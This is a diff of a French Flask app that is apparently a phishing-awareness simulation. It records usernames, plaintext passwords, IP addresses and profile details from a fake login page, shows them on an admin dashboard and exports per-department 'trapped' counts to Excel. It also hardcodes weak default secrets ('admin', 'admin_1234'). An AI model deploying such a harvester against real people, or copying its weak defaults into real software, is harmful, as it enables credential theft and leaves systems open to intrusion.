@@ -6,43 +6,47 @@ from openpyxl.chart import BarChart, Reference
 
 app = Flask(__name__)
 
-# Clés de configuration
-app.secret_key = os.environ.get('SECRET_KEY', 'admin_secret_key')
+# Clés de sécurité et configuration
+app.secret_key = os.environ.get('SECRET_KEY', 'admin')
 ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'admin_1234')
 
-# Base de données temporaire en mémoire
+# Stockage temporaire en mémoire des identifiants et profils
 logs_db = []
 
+
 # ==========================================
-# 1. ROUTES UTILISATEUR (PAGE D'ACCUEIL & SUITE)
+# 1. ROUTES UTILISATEURS (CYBER-PIÈGE)
 # ==========================================
 
-@app.route('/', methods=['GET', 'POST'])
+# Page d'accueil (Affiche le formulaire de connexion)
+@app.route('/')
 def index():
-    if request.method == 'POST':
-        username = request.form.get('username') or request.form.get('email')
-        password = request.form.get('password')
-        
-        # Enregistrement des identifiants interceptés
-        entry = {
-            'id': len(logs_db) + 1,
-            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
-            'username': username,
-            'password': password,
-            'ip': request.remote_addr,
-            'fullname': '',
-            'department': '',
-            'phone': ''
-        }
-        logs_db.append(entry)
-        session['user_id'] = entry['id']
-        
-        # Redirection vers le deuxième formulaire (profil)
-        return redirect(url_for('profile'))
-        
-    # Affiche la page de connexion utilisateur
     return render_template('login.html')
 
+# Traitement du formulaire de connexion
+@app.route('/submit-login', methods=['POST'])
+def submit_login():
+    username = request.form.get('username') or request.form.get('email')
+    password = request.form.get('password')
+    
+    # Enregistrement des identifiants interceptés
+    entry = {
+        'id': len(logs_db) + 1,
+        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+        'username': username,
+        'password': password,
+        'ip': request.remote_addr,
+        'fullname': '',
+        'department': '',
+        'phone': ''
+    }
+    logs_db.append(entry)
+    session['user_id'] = entry['id']
+    
+    # Redirection vers la seconde étape (profil)
+    return redirect(url_for('profile'))
+
+# Formulaire de complément de profil
 @app.route('/profile', methods=['GET', 'POST'])
 def profile():
     user_id = session.get('user_id')
@@ -51,7 +55,7 @@ def profile():
         department = request.form.get('department')
         phone = request.form.get('phone')
         
-        # Mise à jour des données saisies
+        # Mise à jour des informations personnelles
         if user_id:
             for log in logs_db:
                 if log['id'] == user_id:
@@ -63,15 +67,17 @@ def profile():
         
     return render_template('profile.html')
 
+# Page de sensibilisation finale
 @app.route('/success')
 def success():
     return render_template('success.html')
 
 
 # ==========================================
-# 2. ROUTES ADMINISTRATION (/admin)
+# 2. ROUTES ADMINISTRATION (SÉCURISÉES)
 # ==========================================
 
+# Page de connexion administration
 @app.route('/admin/login', methods=['GET', 'POST'])
 def admin_login():
     if request.method == 'POST':
@@ -84,18 +90,21 @@ def admin_login():
             flash('Mot de passe incorrect.', 'error')
     return render_template('admin_login.html')
 
+# Déconnexion admin
 @app.route('/admin/logout')
 def admin_logout():
     session.pop('is_admin', None)
     flash('Vous avez été déconnecté.', 'info')
     return redirect(url_for('admin_login'))
 
+# Tableau de bord admin
 @app.route('/admin')
 def admin_dashboard():
     if not session.get('is_admin'):
         return redirect(url_for('admin_login'))
     return render_template('admin.html', logs=logs_db)
 
+# Effacement des données enregistrées
 @app.route('/admin/clear', methods=['POST'])
 def admin_clear():
     if not session.get('is_admin'):
@@ -104,6 +113,7 @@ def admin_clear():
     flash('Toutes les données ont été effacées.', 'info')
     return redirect(url_for('admin_dashboard'))
 
+# Export des données vers un fichier Excel avec graphique
 @app.route('/admin/export-excel')
 def export_excel():
     if not session.get('is_admin'):
@@ -125,7 +135,7 @@ def export_excel():
         dept = log['department'] or "Non renseigné"
         dept_counts[dept] = dept_counts.get(dept, 0) + 1
 
-    # Feuille 2 : Statistiques avec graphique
+    # Feuille 2 : Statistiques par département
     ws_stats = wb.create_sheet(title="Statistiques")
     ws_stats.append(["Département", "Nombre de piégés"])
     for dept, count in dept_counts.items():
